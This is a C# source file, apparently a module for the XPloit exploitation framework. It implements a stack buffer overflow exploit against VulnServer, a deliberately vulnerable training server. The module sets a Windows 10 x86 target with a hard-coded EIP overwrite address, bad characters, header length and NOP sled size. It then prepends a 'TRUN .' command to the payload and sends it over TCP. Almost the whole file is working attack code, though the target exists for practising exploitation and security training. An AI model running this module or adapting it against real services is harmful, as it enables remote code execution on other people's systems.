using System;
using System.Net.Sockets;
using System.Text;
using XPloit.Core;
using XPloit.Core.Attributes;
using XPloit.Core.Enums;
using XPloit.Core.Extensions;
using XPloit.Core.Interfaces;
using XPloit.Core.Requirements.Payloads;
using XPloit.Helpers;

namespace Exploits.Multi
{
    [ModuleInfo(Author = "Fernando Díaz Toledano", Description = "VulnServer exploit")]
    public class VulnServer : TcpModule
    {
        #region Info
        public override DateTime DisclosureDate { get { return new DateTime(2016, 09, 19); } }
        public override Reference[] References
        {
            get
            {
                return new Reference[]
                {
                    new Reference(EReferenceType.URL, "http://www.thegreycorner.com/2010/12/introducing-vulnserver.html")
                };
            }
        }
        #endregion

        #region Configure
        public override IPayloadRequirements PayloadRequirements { get { return new BufferOverflowPayloadRequirement(); } }
        public override Target[] Targets
        {
            get
            {
                return new Target[]
                {
                    new Target(EPlatform.Windows, EArquitecture.x86,"Windows 10",
                        new Variable("Config", new BufferOverflowPayloadRequirement.BufferOverflowConfig()
                            {
                                EIP = new byte[] { 0xaf , 0x11 , 0x50 , 0x62 },
                                BadChars=new byte[] { 0x00 },
                                HeaderLength=2006,
                                NopCount=5,
                                Space=1000
                            })
                    )
                };
            }
        }
        #endregion

        public override bool Run()
        {
            TcpClient tcp = null;

            try
            {
                Encoding ascii = Encoding.ASCII;

                // Generate payload
                WriteInfo("Generating payload");
                // Header
                byte[] header = ascii.GetBytes("TRUN .");

                // Buffer overflow
                BufferOverflowPayloadRequirement bof = (BufferOverflowPayloadRequirement)PayloadRequirements;
                bof.Config = (BufferOverflowPayloadRequirement.BufferOverflowConfig)Target["Config"];

                byte[] send = header.Concat(bof.Prepare(Target, (BufferOverflowPayloadRequirement.IBufferOverflowPayload)Payload));
                WriteInfo("Payload generated successful", StringHelper.Convert2KbWithBytes(send.Length), ConsoleColor.Green);

                // Send payload
                WriteInfo("Connecting ...");
                tcp = Connect();

                WriteInfo("Connected successful");
                tcp.Client.Send(send);
                WriteInfo("Payload send");
            }
            catch (Exception e)
            {
                WriteError(e.Message);
                return false;
            }
            finally
            {
                Close(tcp);
            }

            return true;
        }
    }
}